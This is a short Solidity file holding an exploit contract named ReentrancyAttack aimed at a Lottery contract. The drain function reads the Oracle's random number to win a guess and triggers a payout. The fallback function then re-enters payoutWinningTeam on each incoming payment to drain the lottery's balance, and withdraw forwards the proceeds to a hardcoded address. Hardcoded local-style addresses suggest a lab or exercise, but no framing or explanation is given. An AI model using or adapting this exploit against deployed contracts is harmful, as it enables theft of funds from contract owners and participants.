// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./Lottery.sol";
import "./Oracle.sol";

contract ReentrancyAttack {

    Lottery lotteryContract;
    Oracle oracleContract;
    
    constructor() public {
        lotteryContract = Lottery(0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8);
        oracleContract = Oracle(0xd9145CCE52D386f254917e481eB44e9943F39138);
    }

    fallback() external payable {
    if (address(lotteryContract).balance >= 0 gwei){
        lotteryContract.payoutWinningTeam(address(this));
        }
    }

    function drain() public payable {
        lotteryContract.makeAGuess(address(this), oracleContract.getRandomNumber() );
        lotteryContract.payoutWinningTeam(address(this));
    }
 
    function withdraw() public {
        (bool sent,) = address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db).call.value(address(this).balance)("");
        require(sent);
    }

    function deposit() public payable {}
}
